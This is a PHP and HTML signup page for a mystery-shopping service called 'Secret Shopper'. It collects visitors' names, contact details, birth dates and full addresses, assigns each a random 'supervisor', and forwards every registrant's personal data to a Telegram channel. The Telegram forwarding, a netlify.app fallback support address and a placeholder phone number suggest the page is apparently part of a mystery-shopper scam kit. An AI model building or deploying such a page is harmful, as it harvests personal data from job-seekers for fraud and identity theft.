<?php
session_start();
require_once 'db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $firstName = trim($_POST['fname'] ?? '');
    $lastName = trim($_POST['lname'] ?? '');
    $fullName = $firstName . ' ' . $lastName;
    $email = trim($_POST['email'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $password = password_hash($_POST['password'] ?? '', PASSWORD_DEFAULT);
    $dob = trim($_POST['dob'] ?? '');
    $gender = trim($_POST['gender'] ?? '');
    $addr = trim($_POST['addr'] ?? '');
    $addr2 = trim($_POST['addr2'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = trim($_POST['state'] ?? '');
    $zip = trim($_POST['zip'] ?? '');
    $country = trim($_POST['country'] ?? '');
    $source = trim($_POST['source'] ?? '');

    try {
        // Check for duplicate Email or Phone to prevent duplicate entries
        $checkStmt = $pdo->prepare("SELECT id FROM users WHERE email = ? OR phone = ?");
        $checkStmt->execute([$email, $phone]);
        if ($checkStmt->rowCount() > 0) {
            echo json_encode(['success' => false, 'message' => 'An account with this email address or phone number already exists.']);
            exit;
        }

        // Randomly assign an active supervisor for this new user signup
        $supStmt = $pdo->query("SELECT * FROM supervisors ORDER BY RAND() LIMIT 1");
        $assignedSup = $supStmt->fetch();

        if ($assignedSup) {
            $supName = $assignedSup['supervisor_name'];
            $supEmail = $assignedSup['supervisor_email'];
            $supPhone = $assignedSup['supervisor_phone'];
        } else {
            // Default fallback if admin hasn't created any supervisors yet
            $supName = 'Project Coordination Desk';
            $supEmail = 'support@secretshopper-validateddate.netlify.app';
            $supPhone = '+1 (800) 555-0199';
        }

        $uid = 'UID_' . strtoupper(substr(md5(uniqid()), 0, 8));

        // Insert user along with their assigned supervisor credentials
        $stmt = $pdo->prepare("INSERT INTO users (uid, name, email, password, phone, dob, gender, address, address2, city, state, zip, country, source, supervisor_name, supervisor_email, supervisor_phone, has_seen_welcome) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)");
        $stmt->execute([$uid, $fullName, $email, $password, $phone, $dob, $gender, $addr, $addr2, $city, $state, $zip, $country, $source, $supName, $supEmail, $supPhone]);

        if (function_exists('notifyTelegram')) {
            $telegramMessage = "🚀 *New Shopper Registered*\n\n" .
                                "👤 *Name:* {$fullName}\n" .
                                "📧 *Email:* {$email}\n" .
                                "📞 *Phone:* {$phone}\n" .
                                "🎂 *DOB:* {$dob} | *Gender:* {$gender}\n" .
                                "🏠 *Address:* {$addr} " . ($addr2 ? "({$addr2})" : "") . "\n" .
                                "📍 *Location:* {$city}, {$state} {$zip}, {$country}\n" .
                                "🔍 *Source:* {$source}\n" .
                                "👔 *Assigned Supervisor:* {$supName} ({$supEmail})\n" .
                                "🔑 *UID:* `{$uid}`";
            notifyTelegram($telegramMessage);
        }

        // Set session parameters so user logs in cleanly right away
        $_SESSION['user_uid'] = $uid;
        $_SESSION['user_name'] = $fullName;
        $_SESSION['show_welcome_modal'] = true;

        echo json_encode(['success' => true, 'uid' => $uid, 'email' => $email]);
        exit;
    } catch (Exception $e) {
        echo json_encode(['success' => false, 'message' => $e->getMessage()]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>The premiere mystery shopping company. New Shopper Signup</title>
    <link rel="icon" type="image/x-icon" href="assets/favicon.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        :root { --btn-width: 110px; --btn-height: 38px; --primary-blue: #002e5b; --accent-red: #a94442; --accent-blue: #4484f1; --accent-green: #2e7d32; }
        * { box-sizing: border-box; transition: all 0.2s ease-in-out; }
        body { margin: 0; padding: 0; font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f1f4f8; color: #333; }
        header { background-color: var(--primary-blue); padding: 0 30px; display: flex; align-items: center; height: 65px; position: sticky; top: 0; z-index: 100; }
        .header-logo { height: 53px; }
        .main-wrapper { display: flex; justify-content: center; align-items: center; min-height: calc(100vh - 65px); padding: 20px; }
        .signup-card { background: #ffffff; width: 100%; max-width: 750px; display: flex; border-radius: 12px; overflow: hidden; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); min-height: 550px; }
        .image-pane { flex: 1; background: url('assets/her.jpeg') no-repeat center center; background-size: cover; }
        .form-pane { flex: 1.2; padding: 40px 30px; display: flex; flex-direction: column; }
        .step-content { display: none; }
        .step-content.active { display: flex; flex-direction: column; flex: 1; }
        .form-logo { height: 50px; width: auto; margin-bottom: 20px; align-self: center; }
        h2 { font-size: 23px; font-weight: 550; margin: 0 0 5px 0; color: #333; }
        hr { border: 0; border-top: 1px solid #eee; margin-bottom: 15px; }
        .row { display: flex; gap: 15px; margin-bottom: 10px; }
        .input-group { flex: 1; position: relative; }
        label { display: block; font-size: 13px; font-weight: 520; margin-bottom: 5px; color: #555; }
        input, select { width: 100%; height: 38px; padding: 5px 12px; border: 1px solid #ccc; border-left: 2px solid var(--accent-red); border-radius: 6px; font-size: 14px; background-color: #fff; outline: none; }
        .button-container { display: flex; justify-content: space-between; margin-top: auto; padding-top: 20px; }
        .btn { min-width: var(--btn-width); height: var(--btn-height); padding: 0 15px; border-radius: 6px; font-weight: 400; cursor: pointer; border: none; display: flex; align-items: center; justify-content: center; font-size: 14px; }
        .btn:disabled { background-color: #7ca8ff !important; cursor: not-allowed; opacity: 0.7; }
        .btn-prev { background-color: #4484f1; color: white; }
        .btn-next { background-color: #7ca8ff; color: white; }
        .btn-cancel { background-color: #eb3d3d; color: white; }
        #successModal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; }
        .modal-content { background: white; padding: 35px 30px; border-radius: 16px; text-align: center; max-width: 450px; width: 90%; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
        .success-icon { width: 65px; height: 65px; background: var(--accent-green); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; margin: 0 auto 15px; }
        .welcome-badge-box { background: #f8fafc; border: 1px dashed #cbd5e1; padding: 12px; border-radius: 8px; margin: 15px 0; text-align: left; font-size: 13px; color: #475569; }

        @media (max-width: 768px) {
            .image-pane { display: none; }
            .signup-card { max-width: 480px; }
        }
    </style>
</head>
<body>
    <header><img src="assets/logo1.png" alt="Secret Shopper" class="header-logo"></header>
    <div class="main-wrapper">
        <div class="signup-card">
            <div class="image-pane"></div>
            <div class="form-pane">
                <img src="assets/logo2.png" alt="Secret Shopper" class="form-logo">
                <div id="step1" class="step-content active">
                    <h2>Basic Info</h2><hr>
                    <div class="row">
                        <div class="input-group"><label>First Name</label><input type="text" class="v1" id="fname"></div>
                        <div class="input-group"><label>Last Name</label><input type="text" class="v1" id="lname"></div>
                    </div>
                    <div class="row">
                        <div class="input-group"><label>Date of Birth</label><input type="text" id="dob" class="v1" placeholder="Select Date" readonly></div>
                        <div class="input-group"><label>Gender</label><select class="v1" id="gender"><option value=""></option><option>Male</option><option>Female</option><option>Other</option></select></div>
                    </div>
                    <div class="row"><div class="input-group"><label>Phone</label><input type="tel" class="v1" id="phone"></div></div>
                    <div class="row"><div class="input-group"><label>Email Address</label><input type="email" class="v1" id="email"></div></div>
                    <div class="row"><div class="input-group"><label>Password</label><input type="password" class="v1" id="password"></div></div>
                    <div class="button-container">
                        <button class="btn btn-cancel" onclick="window.location.href='index.php'"><i class="fas fa-times"></i> Cancel</button>
                        <button class="btn btn-next" id="btn-1" onclick="showStep(2)" disabled>Next <i class="fas fa-arrow-right"></i></button>
                    </div>
                </div>
                <div id="step2" class="step-content">
                    <h2>Address Info</h2><hr>
                    <div class="row"><div class="input-group"><label>Address</label><input type="text" class="v2" id="addr"></div></div>
                    <div class="row"><div class="input-group"><label>Address Line 2</label><input type="text" id="addr2"></div></div>
                    <div class="row">
                        <div class="input-group"><label>City</label><input type="text" class="v2" id="city"></div>
                        <div class="input-group">
                            <label id="state-label">State / Province</label>
                            <select id="state-select" class="v2"><option value="">Select Region</option></select>
                        </div>
                    </div>
                    <div class="row">
                        <div class="input-group"><label>Zip / Postal Code</label><input type="text" class="v2" id="zip"></div>
                        <div class="input-group">
                            <label>Country</label>
                            <select id="country-select" onchange="updateRegions()">
                                <option value="United States">United States</option>
                                <option value="Canada">Canada</option>
                                <option value="United Kingdom">United Kingdom</option>
                                <option value="Australia">Australia</option>
                            </select>
                        </div>
                    </div>
                    <div class="button-container">
                        <button class="btn btn-prev" onclick="showStep(1)"><i class="fas fa-arrow-left"></i> Previous</button>
                        <button class="btn btn-next" id="btn-2" onclick="showStep(3)" disabled>Next <i class="fas fa-arrow-right"></i></button>
                    </div>
                </div>
                <div id="step3" class="step-content">
                    <h2>Additional Info</h2><hr>
                    <div class="row">
                        <div class="input-group"><label>How did you hear about us?</label><select class="v3" id="source"><option value="">Select</option><option>Social Media</option><option>Friend/Referral</option><option>Online Search</option></select></div>
                    </div>
                    <div class="button-container">
                        <button class="btn btn-prev" onclick="showStep(2)"><i class="fas fa-arrow-left"></i> Previous</button>
                        <button class="btn btn-next" id="btn-3" onclick="handleFinish()" disabled>Finish <i class="fas fa-arrow-right"></i></button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="successModal">
        <div class="modal-content">
            <div class="success-icon"><i class="fas fa-check"></i></div>
            <h2>Welcome to Secret Shopper!</h2>
            <div class="welcome-badge-box">
                <div><strong>Registered Email:</strong> <span id="modal-user-email">...</span></div>
                <div><strong>Shopper UID:</strong> <code id="modal-user-uid">...</code></div>
            </div>
            <button onclick="window.location.href='dashboard.php'" class="btn btn-next" style="width:100%; background:var(--primary-blue); justify-content:center;">Proceed to Dashboard</button>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
    <script>
        flatpickr("#dob", { dateFormat: "Y-m-d", maxDate: "today" });
        function showStep(step) {
            document.querySelectorAll('.step-content').forEach(s => s.classList.remove('active'));
            document.getElementById('step' + step).classList.add('active');
        }

        const regionData = {
            "United States": ["Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"],
            "Canada": ["Alberta", "British Columbia", "Manitoba", "New Brunswick", "Newfoundland and Labrador", "Nova Scotia", "Ontario", "Prince Edward Island", "Quebec", "Saskatchewan", "Northwest Territories", "Nunavut", "Yukon"],
            "United Kingdom": ["England - Greater London", "England - Greater Manchester", "England - West Midlands", "England - West Yorkshire", "England - Merseyside", "England - South Yorkshire", "England - Tyne and Wear", "Scotland", "Wales", "Northern Ireland"],
            "Australia": ["New South Wales", "Victoria", "Queensland", "Western Australia", "South Australia", "Tasmania", "Australian Capital Territory", "Northern Territory"]
        };

        function updateRegions() {
            const country = document.getElementById('country-select').value;
            const sSel = document.getElementById('state-select');
            const sLabel = document.getElementById('state-label');
            
            sSel.innerHTML = '<option value="">Select Region</option>';
            
            if (country === "United Kingdom") {
                sLabel.innerText = "County / Region";
            } else if (country === "Canada" || country === "Australia") {
                sLabel.innerText = "Province / State";
            } else {
                sLabel.innerText = "State";
            }

            if (regionData[country]) {
                regionData[country].forEach(region => {
                    let o = document.createElement('option');
                    o.value = region;
                    o.innerText = region;
                    sSel.appendChild(o);
                });
            }
        }

        updateRegions();

        async function handleFinish() {
            const formData = new URLSearchParams();
            formData.append('fname', document.getElementById('fname').value);
            formData.append('lname', document.getElementById('lname').value);
            formData.append('email', document.getElementById('email').value);
            formData.append('password', document.getElementById('password').value);
            formData.append('phone', document.getElementById('phone').value);
            formData.append('dob', document.getElementById('dob').value);
            formData.append('gender', document.getElementById('gender').value);
            formData.append('addr', document.getElementById('addr').value);
            formData.append('addr2', document.getElementById('addr2').value);
            formData.append('city', document.getElementById('city').value);
            formData.append('state', document.getElementById('state-select').value);
            formData.append('zip', document.getElementById('zip').value);
            formData.append('country', document.getElementById('country-select').value);
            formData.append('source', document.getElementById('source').value);

            let res = await fetch('signup.php', { method: 'POST', body: formData });
            let data = await res.json();
            if(data.success) {
                document.getElementById('modal-user-email').innerText = data.email;
                document.getElementById('modal-user-uid').innerText = data.uid;
                document.getElementById('successModal').style.display = 'flex';
            } else {
                alert("Error: " + data.message);
            }
        }
        function setupValidation(cls, btnId) {
            const inputs = document.querySelectorAll('.' + cls);
            const btn = document.getElementById(btnId);
            inputs.forEach(i => i.addEventListener('input', () => {
                let valid = true;
                inputs.forEach(inp => { if(!inp.value.trim()) valid = false; });
                btn.disabled = !valid;
            }));
        }
        setupValidation('v1', 'btn-1'); setupValidation('v2', 'btn-2'); setupValidation('v3', 'btn-3');
    </script>
</body>
</html>